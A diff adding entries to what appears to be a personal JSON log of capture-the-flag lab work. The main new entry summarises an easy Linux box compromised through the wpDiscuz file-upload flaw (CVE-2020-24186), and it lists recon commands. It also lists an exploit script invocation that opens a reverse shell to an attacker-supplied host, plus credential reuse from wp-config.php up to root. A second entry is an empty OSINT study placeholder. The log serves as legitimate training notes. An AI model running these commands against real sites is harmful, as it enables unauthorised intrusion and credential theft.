@@ -4478,5 +4478,63 @@
     ],
     "summary": "Box Redshock (Moderate, Linux, 15pt, Hacktrace) — full kill chain. Merangkai beberapa kerentanan low-to-moderate menjadi kompromi sistem penuh: FTP anonymous → Go binary reverse engineering → JWT secret crack → web auth bypass → credential leak → SSH foothold → SUID stack buffer overflow → root. Pelajaran utama: penilaian severity harus mempertimbangkan potensi chaining antar-vuln, bukan cuma risiko masing-masing kerentanan secara terpisah.",
     "url": ""
+  },
+  {
+    "id": "hacktrace-eleet",
+    "date": "2026-06-15",
+    "title": "E-LEET",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive / Boot2Root",
+    "tags": [
+      "wordpress",
+      "wpdiscuz",
+      "rce",
+      "password-reuse",
+      "linux",
+      "easy"
+    ],
+    "concepts": [
+      "Unauthenticated arbitrary file upload to RCE on wpDiscuz (CVE-2020-24186)",
+      "WordPress plugin enumeration with WPScan aggressive plugin detection",
+      "Credential harvesting from wp-config.php (plaintext DB creds)",
+      "Password reuse as a chain multiplier: www-data -> miko -> root"
+    ],
+    "terms": [
+      "CVE-2020-24186",
+      "wpDiscuz 7.x",
+      "wmuSecurity nonce",
+      "wp_post_id"
+    ],
+    "commands": [
+      "sudo nmap -sVC --min-rate 1000 -p- -Pn -T4 -oN nmap-eleet.log eleet.htr",
+      "gobuster dir -u http://eleet.htr -w big.txt -x php,txt,zip,env,git,log -b 404,403",
+      "wpscan --url http://eleet.htr/wordpress --plugins-detection aggressive",
+      "python3 wpdiscuz_rce.py -u http://eleet.htr/wordpress -p \"/?p=1\" --reverse --lhost <ip> --lport 9394",
+      "su miko   (reuse DB_PASSWORD from wp-config.php)",
+      "sudo su   (same reused password -> root)"
+    ],
+    "problems": [
+      "WPScan reported wpDiscuz 7.0.2 but the public PoC targets 7.0.4; confirmed vulnerability class still applied and exploit landed."
+    ],
+    "summary": "Easy Linux box. Recon found a WordPress install with the vulnerable wpDiscuz plugin. Exploited CVE-2020-24186 unauth file upload for a PHP webshell and reverse shell as www-data. Harvested plaintext DB credentials from wp-config.php, then escalated horizontally (su miko) and vertically (sudo su) purely through password reuse. Root flag captured. Key takeaway: one weak operational practice (credential reuse) turned a limited foothold into full compromise.",
+    "url": ""
+  },
+  {
+    "id": "osint-weekly-presentation-prep",
+    "date": "2026-06-15",
+    "title": "OSINT Weekly Presentation Prep",
+    "platform": "Self-Study",
+    "category": "Learning / Research",
+    "tags": [
+      "osint",
+      "presentation",
+      "research"
+    ],
+    "concepts": [],
+    "terms": [],
+    "commands": [],
+    "problems": [],
+    "summary": "Prep work for next Friday's weekly presentation on OSINT. Placeholder entry to track the research/prep effort; will enrich concepts and terms as the deck develops.",
+    "url": ""
   }
 ]
